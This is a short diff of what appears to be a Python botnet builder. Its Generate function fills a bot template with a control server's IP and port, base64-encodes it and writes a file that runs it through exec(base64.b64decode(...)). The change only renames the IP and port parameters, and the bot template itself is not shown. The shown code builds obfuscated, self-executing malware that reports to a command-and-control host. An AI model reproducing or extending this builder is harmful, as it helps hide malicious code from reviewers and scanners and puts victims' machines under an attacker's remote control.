@@ -66,10 +66,10 @@ except:
     exit(0)         
 """
 
-def Generate(BotSrc,BotIp,BotPort):
+def Generate(BotSrc,ControlIp,ControlPort):
     try:
         BotFile = open(BotSrc,"w+")
-        BotFile.write("import base64;exec(base64.b64decode(%s))" % str(base64.b64encode(str(BotCode.format(BotIp,BotPort)).encode())))
+        BotFile.write("import base64;exec(base64.b64decode(%s))" % str(base64.b64encode(str(BotCode.format(ControlIp,ControlPort)).encode())))
         BotFile.close()
         return "ok"
     except:
